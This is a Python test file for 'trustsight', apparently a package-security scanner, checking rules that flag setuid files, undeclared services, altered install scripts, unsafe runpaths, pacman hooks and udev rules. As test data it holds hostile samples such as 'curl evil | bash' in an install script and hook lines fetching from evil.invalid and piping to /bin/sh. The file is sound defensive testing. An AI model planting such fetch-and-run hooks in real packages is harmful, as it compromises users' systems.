"""The A-series artifact inspection (pure, no execution)."""

from trustsight.analysis.artifact import inspect_manifest, inspect_manifest_bounded


def _ids(manifest, declared=None):
    return {f["rule_id"] for f in inspect_manifest(manifest, declared)}


def test_a001_fires_for_an_unjustified_setuid_file():
    manifest = [{"path": "/usr/bin/suidtool", "setuid": True}]
    assert "A001" in _ids(manifest)
    assert "A001" not in _ids(manifest, {"mode_intent": "documented setuid"})


def test_a001_derives_the_bit_from_the_recorded_mode():
    """The manifest contract records modes; the flag is an override."""
    assert "A001" in _ids([{"path": "/usr/bin/suidtool", "mode": 0o4755}])
    assert "A001" in _ids([{"path": "/usr/bin/sgidtool", "mode": 0o2755}])
    assert "A001" not in _ids([{"path": "/usr/bin/plain", "mode": 0o755}])


def test_a002_fires_for_an_undeclared_unit():
    manifest = [{"path": "/usr/lib/systemd/system/evil.service"}]
    assert "A002" in _ids(manifest)
    assert "A002" not in _ids(
        manifest,
        {"units": ["/usr/lib/systemd/system/evil.service"]},
    )


def test_a003_fires_for_a_library_outside_depends():
    manifest = [{"path": "/usr/bin/app", "links": ["libz.so.1", "libevil.so.2"]}]
    assert "A003" in _ids(manifest, {"depends": ["zlib"]})


def test_a003_accepts_a_soname_named_in_provides():
    manifest = [{"path": "/usr/bin/app",
                 "elf": {"needed": ["libz.so.1"]}}]
    declared = {"depends": ["glibc"], "provides": ["libz.so=1-64"]}
    assert "A003" not in _ids(manifest, declared)


def test_a003_still_fires_when_neither_depends_nor_provides_covers_it():
    manifest = [{"path": "/usr/bin/app",
                 "elf": {"needed": ["libevil.so.2"]}}]
    declared = {"depends": ["glibc"], "provides": ["libz.so=1-64"]}
    assert "A003" in _ids(manifest, declared)


def test_a003_accepts_the_closure_library_list():
    manifest = [{"path": "/usr/bin/app",
                 "elf": {"needed": ["libc.so.6", "libz.so.1"]}}]
    declared = {"depends": ["glibc"], "libs": ["libc.so.6", "libz.so.1"]}
    assert "A003" not in _ids(manifest, declared)


def test_a004_fires_when_the_built_install_differs():
    declared = {
        "install_text": "post_install() { echo hi; }",
        "built_install_text": "post_install() { echo hi; curl evil | bash; }",
    }
    assert "A004" in _ids([], declared)


def test_a005_fires_for_world_writable_and_unusual_exec():
    manifest = [
        {"path": "/etc/skel/note", "world_writable": True},
        {"path": "/opt/tool/run", "mode": 0o755},
    ]
    ids = _ids(manifest)
    assert "A005" in ids


def test_a005_derives_world_writable_from_the_recorded_mode():
    assert "A005" in _ids([{"path": "/etc/skel/note", "mode": 0o666}])
    # A world-writable directory is a mount/permission choice, not a file.
    assert "A005" not in _ids([{"path": "/var/tmp/pkg/", "mode": 0o777}])
    assert "A005" not in _ids([{"path": "/etc/skel/note", "mode": 0o644}])


def test_executable_in_a_usual_path_is_not_a005():
    manifest = [{"path": "/usr/bin/tool", "mode": 0o755}]
    assert "A005" not in _ids(manifest)


def test_verify_build_is_unavailable_by_default(monkeypatch):
    monkeypatch.setattr("trustsight.config.load_config", lambda: {})
    from trustsight.api import TrustSight

    client = TrustSight(auto_import_seed=False)
    result = client.verify_build("demo")
    assert result["status"] == "l9_unavailable"


def test_verify_build_inspects_when_enabled(monkeypatch):
    monkeypatch.setattr(
        "trustsight.config.load_config", lambda: {"verify": {"enabled": True}})
    from trustsight.api import TrustSight

    client = TrustSight(auto_import_seed=False)
    result = client.verify_build(
        "demo", manifest=[{"path": "/usr/bin/x", "setuid": True}])
    assert result["status"] == "l9_analyzed"
    assert any(f["rule_id"] == "A001" for f in result["findings"])


def test_a006_a007_a008_fire_on_privileged_and_bpf_artifacts():
    from trustsight.analysis.artifact import inspect_manifest

    ids = {f["rule_id"] for f in inspect_manifest([
        {"path": "/usr/bin/helper", "caps": "cap_setuid+ep"},
        {"path": "/etc/sudoers.d/pkg", "mode": 0o440},
        {"path": "/usr/lib/modules/6.1/evil.ko"},
        {"path": "/usr/lib/app/tracker.bpf.o"},
    ])}
    assert {"A006", "A007", "A008"} <= ids


def test_l9_divergence_when_static_and_artifact_disagree(monkeypatch):
    monkeypatch.setattr(
        "trustsight.config.load_config", lambda: {"verify": {"enabled": True}})
    from trustsight.api import TrustSight

    client = TrustSight(auto_import_seed=False)
    # Static clean, artifact has a HIGH finding -> divergence.
    diverging = client.verify_build(
        "demo", manifest=[{"path": "/usr/bin/x", "setuid": True}],
        static_clean=True)
    assert diverging.get("l9_divergence") is True
    # Static also flagged -> no divergence.
    agreeing = client.verify_build(
        "demo", manifest=[{"path": "/usr/bin/x", "setuid": True}],
        static_clean=False)
    assert "l9_divergence" not in agreeing


def test_a_normal_artifact_fires_no_a_rule():
    """Benign coverage: an ordinary package's manifest trips no A rule."""
    manifest = [
        {"path": "/usr/bin/demo", "mode": 0o755, "links": ["libdemo.so.1"]},
        {"path": "/usr/lib/libdemo.so.1", "mode": 0o644},
        {"path": "/usr/lib/systemd/system/demo.service", "mode": 0o644},
        {"path": "/usr/share/doc/demo/README", "mode": 0o644},
    ]
    declared = {
        "depends": ["glibc", "libdemo"],
        "units": ["/usr/lib/systemd/system/demo.service"],
        "install_text": "post_install() {\n  echo ok\n}\n",
        "built_install_text": "post_install() {\n  echo ok\n}\n",
    }
    assert _ids(manifest, declared) == set()


def test_verify_build_without_a_manifest_names_the_handoff(monkeypatch):
    """The lane is unavailable because nothing built the package, not because
    a container happened to be missing."""
    monkeypatch.setattr(
        "trustsight.config.load_config", lambda: {"verify": {"enabled": True}})
    from trustsight.api import TrustSight

    result = TrustSight(auto_import_seed=False).verify_build("demo")
    assert result["status"] == "l9_unavailable"
    assert "manifest" in result["reason"]
    assert "build" in result["reason"]


def test_read_manifest_returns_raw_text(tmp_path):
    from trustsight.cli.inspect.commands import _read_manifest

    path = tmp_path / "manifest.json"
    text = '{"path": "/usr/bin/x"}'
    path.write_text(text, encoding="utf-8")
    assert _read_manifest(str(path)) == text


def test_bounded_manifest_caps_entries_and_findings(monkeypatch):
    from trustsight.analysis import artifact

    monkeypatch.setattr(artifact, "MAX_MANIFEST_ENTRIES", 2)
    monkeypatch.setattr(artifact, "MAX_FINDINGS", 2)
    result = artifact.inspect_manifest_bounded([
        {"path": "/usr/bin/a", "setuid": True},
        {"path": "/usr/bin/b", "setuid": True},
        {"path": "/usr/bin/c", "setuid": True},
    ])
    assert len(result["findings"]) == 2
    assert result["limits"]["truncated"] is True
    assert "manifest entries" in result["limits"]["reasons"]


def test_bounded_manifest_caps_links(monkeypatch):
    from trustsight.analysis import artifact

    monkeypatch.setattr(artifact, "MAX_LINKS_PER_ENTRY", 2)
    result = artifact.inspect_manifest_bounded([{
        "path": "/usr/bin/app",
        "links": ["liba.so", "libb.so", "libevil.so"],
    }], {"depends": ["liba", "libb"]})
    assert result["findings"] == []
    assert result["limits"]["truncated"] is True
    assert "links" in result["limits"]["reasons"]


def test_bounded_manifest_declared_text_cap_skips_a004(monkeypatch):
    from trustsight.analysis import artifact

    monkeypatch.setattr(artifact, "MAX_DECLARED_TEXT_BYTES", 4)
    result = artifact.inspect_manifest_bounded([], {
        "install_text": "one!!!",
        "built_install_text": "two!!!",
    })
    assert {f["rule_id"] for f in result["findings"]} == set()
    assert "declared text" in result["limits"]["reasons"]


def test_bounded_manifest_marks_truncated_content(monkeypatch):
    from trustsight.analysis import artifact

    monkeypatch.setattr(artifact, "MAX_CONTENT_BYTES", 4)
    result = artifact.inspect_manifest_bounded([
        {"path": "/etc/x.hook", "content": "Operation = *\nExec = evil\n"},
    ])
    assert result["limits"]["truncated"] is True
    assert "content bytes" in result["limits"]["reasons"]


def test_verify_build_partial_surfaces_limits(monkeypatch):
    monkeypatch.setattr(
        "trustsight.config.load_config", lambda: {"verify": {"enabled": True}})
    from trustsight.sandbox import manifest_client

    monkeypatch.setattr(
        manifest_client, "inspect_artifact_manifest",
        lambda **kwargs: {
            "findings": [],
            "limits": {"truncated": True, "reasons": ["manifest entries"]},
        })
    from trustsight.api import TrustSight

    result = TrustSight(auto_import_seed=False).verify_build(
        "demo", manifest=[{"path": "/usr/bin/x"}], static_clean=True)
    assert result["status"] == "l9_partial"
    assert result["truncated"] is True
    assert result["limits"]["reasons"] == ["manifest entries"]
    assert "l9_divergence" not in result


def test_verify_build_sandbox_unavailable_is_named(monkeypatch):
    monkeypatch.setattr(
        "trustsight.config.load_config", lambda: {"verify": {"enabled": True}})
    from trustsight.sandbox import manifest_client

    def unavailable(**kwargs):
        raise manifest_client.ManifestUnavailable("sandbox refused")

    monkeypatch.setattr(
        manifest_client, "inspect_artifact_manifest", unavailable)
    from trustsight.api import TrustSight

    result = TrustSight(auto_import_seed=False).verify_build(
        "demo", manifest=[{"path": "/usr/bin/x"}])
    assert result["status"] == "l9_unavailable"
    assert "sandbox" in result["reason"]


def test_verify_build_cli_passes_a_manifest(monkeypatch, tmp_path):
    import json as _json

    from typer.testing import CliRunner

    from trustsight.cli import app

    manifest = tmp_path / "manifest.json"
    manifest.write_text(_json.dumps([{"path": "/usr/bin/x", "setuid": True}]))
    monkeypatch.setattr(
        "trustsight.config.load_config",
        lambda: {"verify": {"enabled": True}})
    monkeypatch.setattr(
        "trustsight.cli.inspect.commands.analyze_package",
        lambda *a, **k: (_ for _ in ()).throw(RuntimeError("offline")))

    result = CliRunner().invoke(
        app, ["verify-build", "demo", "--manifest", str(manifest), "--json"])
    assert result.exit_code == 0, result.stdout
    payload = _json.loads(result.stdout)
    assert payload["status"] == "l9_analyzed"
    assert any(f["rule_id"] == "A001" for f in payload["findings"])


def test_a003_uses_the_elf_needed_list_when_present():
    manifest = [{"path": "/usr/bin/app",
                 "elf": {"needed": ["libevil.so.2"]}}]
    assert "A003" in _ids(manifest, {"depends": ["glibc"]})


def test_a014_flags_an_unsafe_runpath():
    manifest = [{"path": "/usr/bin/app",
                 "elf": {"rpath": ["/tmp/lib"], "runpath": []}}]
    assert "A014" in _ids(manifest)


def test_a014_allows_origin_relative_runpath():
    manifest = [{"path": "/usr/bin/app",
                 "elf": {"runpath": ["$ORIGIN/../lib"]}}]
    assert "A014" not in _ids(manifest)


def test_a014_rejects_root_and_double_slash_temp():
    for runpath in ("/", "//tmp/lib"):
        manifest = [{"path": "/usr/bin/app",
                     "elf": {"runpath": [runpath]}}]
        assert "A014" in _ids(manifest), runpath


def test_a014_rejects_traversal_out_of_origin():
    for runpath in ("$ORIGIN/../../../../tmp",
                    "$ORIGIN/../../../home",
                    "$ORIGIN/..",
                    "$ORIGIN/../..",
                    "${ORIGIN}/..",
                    "/tmp/$ORIGIN"):
        manifest = [{"path": "/usr/bin/app",
                     "elf": {"runpath": [runpath]}}]
        assert "A014" in _ids(manifest), runpath


def test_a015_flags_a_packed_binary():
    manifest = [{"path": "/usr/bin/app", "elf": {"packed": True}}]
    assert "A015" in _ids(manifest)


def test_a011_fires_on_a_broad_hook_with_an_exec():
    manifest = [{"path": "/usr/share/libalpm/hooks/x.hook",
                 "content": "[Trigger]\nOperation = *\nExec = /usr/bin/foo\n"}]
    assert "A011" in _ids(manifest)


def test_a011_does_not_fire_on_a_specific_operation():
    manifest = [{"path": "/usr/share/libalpm/hooks/x.hook",
                 "content": "[Trigger]\nOperation = Install\nExec = /usr/bin/foo\n"}]
    assert "A011" not in _ids(manifest)


def test_a012_fires_on_a_fetch_in_a_hook():
    manifest = [{"path": "/usr/share/libalpm/hooks/x.hook",
                 "content": "[Trigger]\nOperation = Install\n"
                            "Exec = /usr/bin/curl https://evil.invalid/x\n"}]
    assert "A012" in _ids(manifest)


def test_a012_does_not_fire_on_a_plain_shell_command():
    manifest = [{"path": "/usr/share/libalpm/hooks/x.hook",
                 "content": "[Trigger]\nOperation = Install\n"
                            "Exec = /bin/sh -c 'update-info /usr/share/info'\n"}]
    assert "A012" not in _ids(manifest)


def test_a012_does_not_fire_on_a_plain_exec():
    manifest = [{"path": "/usr/share/libalpm/hooks/x.hook",
                 "content": "[Trigger]\nOperation = Install\nExec = /usr/bin/foo\n"}]
    assert "A012" not in _ids(manifest)


def test_a013_fires_on_a_udev_program():
    manifest = [{"path": "/etc/udev/rules.d/99-x.rules",
                 "content": 'ACTION=="add", RUN+="/usr/bin/evil"\n'}]
    assert "A013" in _ids(manifest)


def test_a012_ignores_a_comment():
    manifest = [{"path": "/etc/x.hook",
                 "content": "# curl https://evil.invalid/x\nOperation = Install\n"}]
    assert "A012" not in _ids(manifest)


def test_a012_ignores_printed_instructions_about_fetch_or_paths():
    content = ("[Trigger]\nOperation = Install\n"
               "Exec = /usr/bin/echo 'do not curl this from /tmp'\n")
    manifest = [{"path": "/etc/x.hook", "content": content}]
    assert "A012" not in _ids(manifest)


def test_a012_still_fires_on_printed_command_substitution():
    content = ("[Trigger]\nOperation = Install\n"
               "Exec = /usr/bin/echo \"$(curl https://evil.invalid/x)\"\n")
    manifest = [{"path": "/etc/x.hook", "content": content}]
    assert "A012" in _ids(manifest)


def test_a012_sees_a_pipe_to_an_absolute_shell():
    content = ("[Trigger]\nOperation = Install\n"
               "Exec = /usr/bin/echo \"curl x\" | /bin/sh\n")
    manifest = [{"path": "/etc/x.hook", "content": content}]
    assert "A012" in _ids(manifest)


def test_a013_ignores_a_comment():
    manifest = [{"path": "/etc/udev/rules.d/99-x.rules",
                 "content": '# RUN+="/usr/bin/evil"\nACTION=="add", SYMLINK+="x"\n'}]
    assert "A013" not in _ids(manifest)


def test_a013_does_not_fire_on_a_symlink_only_rule():
    manifest = [{"path": "/etc/udev/rules.d/99-x.rules",
                 "content": 'ACTION=="add", SYMLINK+="x"\n'}]
    assert "A013" not in _ids(manifest)


def test_content_beyond_the_cap_is_not_scanned():
    content = "x" * (64 * 1024) + " curl https://evil.invalid/x"
    assert "A012" not in _ids([{"path": "/etc/x.hook", "content": content}])


def test_verify_build_cli_reports_partial_and_cleans_output(monkeypatch, tmp_path):
    from typer.testing import CliRunner

    from trustsight.api import TrustSight
    from trustsight.cli import app

    manifest = tmp_path / "manifest.json"
    manifest.write_text('[{"path": "/usr/bin/x"}]', encoding="utf-8")
    monkeypatch.setattr(
        "trustsight.config.load_config",
        lambda: {"verify": {"enabled": True}})
    monkeypatch.setattr(
        "trustsight.cli.inspect.commands.analyze_package",
        lambda *a, **k: (_ for _ in ()).throw(RuntimeError("offline")))
    monkeypatch.setattr(
        TrustSight, "verify_build",
        lambda self, package, **kwargs: {
            "status": "l9_partial",
            "findings": [{"rule_id": "A001", "match": "\x1b[31mevil\x1b[0m"}],
            "limits": {"reasons": ["\x1b[31mmanifest entries\x1b[0m"]},
            "truncated": True,
        })

    result = CliRunner().invoke(
        app, ["verify-build", "demo", "--manifest", str(manifest)])
    assert result.exit_code == 0, result.stdout
    assert "L9 inspection truncated" in result.stdout
    assert "\x1b" not in result.stdout


def test_bounded_inspector_refuses_a_non_list_manifest():
    result = inspect_manifest_bounded({"path": "/usr/bin/x"}, None)
    assert result["findings"] == []
    assert result["limits"]["truncated"] is True
    assert "invalid manifest" in result["limits"]["reasons"]
